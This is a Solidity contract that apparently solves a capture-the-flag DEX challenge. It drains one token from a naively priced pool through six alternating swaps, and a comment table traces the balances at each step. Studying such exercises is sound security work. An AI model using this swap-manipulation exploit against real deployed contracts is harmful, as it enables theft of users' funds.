// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IDex {
    function swap(address from, address to, uint amount) external;
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
    function token1() external returns (address);
    function token2() external returns (address);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract DexAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    /** 
    *     Step  |       DEX       |      Player  
    *           | token1 - token2 | token1 - token2 
    *   ---------------------------------------------
    *     Init  |   100     100   |    10      10    
    *   Swap 1  |   110      90   |     0      20    
    *   Swap 2  |    86     110   |    24       0    
    *   Swap 3  |   110      80   |     0      30    
    *   Swap 4  |    69     110   |    41       0
    *   Swap 5  |   110      45   |     0      65   
    *   Swap 6  |     0      90   |   110      20
    */
    function attack() external {
        (address token1, address token2) = (IDex(challengeInstance).token1(), IDex(challengeInstance).token2());
        IERC20(token1).transferFrom(msg.sender, address(this), 10);
        IERC20(token2).transferFrom(msg.sender, address(this), 10);
        IDex(challengeInstance).approve(address(challengeInstance), type(uint).max);
        IDex(challengeInstance).swap(token1, token2, IDex(challengeInstance).balanceOf(token1, address(this)));
        IDex(challengeInstance).swap(token2, token1, IDex(challengeInstance).balanceOf(token2, address(this)));
        IDex(challengeInstance).swap(token1, token2, IDex(challengeInstance).balanceOf(token1, address(this)));
        IDex(challengeInstance).swap(token2, token1, IDex(challengeInstance).balanceOf(token2, address(this)));
        IDex(challengeInstance).swap(token1, token2, IDex(challengeInstance).balanceOf(token1, address(this)));
        IDex(challengeInstance).swap(token2, token1, 45);
    }
}